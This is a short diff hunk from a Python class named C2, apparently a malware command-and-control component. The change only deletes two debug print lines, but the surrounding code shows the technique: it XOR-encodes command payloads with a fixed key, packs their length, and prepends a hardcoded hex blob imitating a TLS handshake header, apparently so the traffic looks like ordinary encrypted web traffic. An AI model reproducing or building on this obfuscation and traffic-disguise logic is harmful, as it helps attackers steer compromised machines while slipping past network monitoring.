@@ -43,8 +43,7 @@ class C2:
         payload = command + cmd_len
         payload = bytes([b ^ 0x4F for b in payload])
         payload_len = struct.pack("!H", len(payload))
-        print(f"Payload length: {len(payload)}")
-        print(f"payload_len: {payload_len.hex()}")
+
         tls_header = bytes.fromhex(
             "16030300800200007c0303dd875280dfd6e98188d937fbf419b0320d9a84af35b14219aa2ac9997"
             + "f02f9c420daab940bafefb1e25dc171e4f85b02a1f7b80b661bfdd7270021c89fe7988040130100"
